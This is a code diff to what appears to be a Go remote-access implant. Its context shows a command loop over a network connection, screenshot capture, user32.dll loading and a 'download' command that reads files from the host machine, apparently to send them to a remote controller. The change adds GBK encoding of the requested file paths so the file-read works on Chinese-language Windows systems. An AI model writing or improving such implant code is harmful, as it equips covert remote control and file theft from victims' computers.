@@ -2,6 +2,7 @@ package work
 
 import (
 	"bufio"
+	"bytes"
 	"encoding/base64"
 	"fmt"
 	"github.com/phil-fly/generate/pool/osinfo"
@@ -17,6 +18,8 @@ import (
 	"time"
 
 	screenshot "github.com/kbinani/screenshot"
+	"golang.org/x/text/encoding/simplifiedchinese"
+	"golang.org/x/text/transform"
 )
 
 var (
@@ -24,8 +27,6 @@ var (
 	FOLDER_PATH        = "\\ProgramData"
 	NEW_LINE    string = "\n"
 )
-
-var ()
 
 var (
 	dll, _              = syscall.LoadDLL("user32.dll")
@@ -102,8 +103,8 @@ func Connect() {
 
 		case "download":
 			pathDownload := ReceiveMessageStdEncoding(conn)
-			fmt.Println(pathDownload)
-			file, err := ioutil.ReadFile(string(pathDownload))
+			fileName,_:= Utf8ToGbk([]byte(pathDownload))
+			file, err := ioutil.ReadFile(string(fileName))
 			if err != nil {
 				conn.Write([]byte("[!] File not found!" + "\n"))
 			}
@@ -172,6 +173,15 @@ func Connect() {
 			RemoveNewLineCharFromConnection(conn)
 		} // end switch
 	}
+}
+
+func Utf8ToGbk(s []byte) ([]byte, error) {
+	reader := transform.NewReader(bytes.NewReader(s), simplifiedchinese.GBK.NewEncoder())
+	d, e := ioutil.ReadAll(reader)
+	if e != nil {
+		return nil, e
+	}
+	return d, nil
 }
 
 func getPersonal() (string, error) {
